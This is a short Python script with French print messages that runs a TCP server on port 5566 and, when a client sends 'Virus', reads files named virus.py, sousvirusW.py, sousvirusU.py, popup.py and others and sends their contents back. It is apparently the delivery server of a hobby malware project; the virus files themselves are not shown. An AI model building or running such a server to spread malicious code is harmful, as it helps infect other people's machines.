import socket

host, port = ('',5566)

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((host,port))
print("serveur on...")

while True:
    socket.listen()
    conn, address = socket.accept()
    print("En ecoute..")

    data = conn.recv(4096)
    data = data.decode("utf8")
    print(data)
    if data == "Test":
        conn.sendall("Test recu".encode("utf8"))
    if data == "Virus":
        fic = open("virus.py","r")
        dataV = fic.read()
        fic.close()
        fic = open("sousvirusW.py","r")
        dataSVW = fic.read()
        fic.close() 
        fic = open("data.txt","r")
        dataD = fic.read()
        fic.close() 
        fic = open("compteur.py","r")
        dataC = fic.read()
        fic.close() 
        fic = open("popup.py","r")
        dataP = fic.read()
        fic.close() 
        fic = open("sousvirusU.py","r")
        dataSVU = fic.read()
        fic.close() 
        data = dataV + "[|]" + dataSVW + "[|]" + dataD + "[|]" + dataC + "[|]" + dataP + "[|]" + dataSVU
        conn.sendall(data.encode("utf8"))
        print("envoyé")

conn.close()
socket.close()
